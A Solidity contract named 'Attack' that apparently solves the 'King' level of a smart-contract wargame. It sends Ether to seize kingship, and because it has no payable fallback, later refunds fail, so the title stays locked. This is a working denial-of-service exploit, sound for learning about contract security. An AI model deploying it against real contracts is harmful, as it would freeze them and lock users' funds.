// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract Attack {
    address public victimAddress;
    address public owner;
    constructor(address _victimAddress) {
        victimAddress = _victimAddress;
        owner = msg.sender;    
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function becomeKing() external payable onlyOwner {
        (bool success,) = payable(address(victimAddress)).call{value: msg.value}("");
        require(success, "Transfer not successfull");
    }
}